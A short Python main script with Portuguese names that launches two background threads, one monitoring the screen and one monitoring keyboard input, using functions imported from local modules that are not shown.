import threading
import time
from input import monitorar_teclas
from screen import monitorar_tela

def iniciar_programa():
    threading.Thread(target=monitorar_tela, daemon=True).start()
    threading.Thread(target=monitorar_teclas, daemon=True).start()

    while True:
        time.sleep(1)

if __name__ == "__main__":
    iniciar_programa()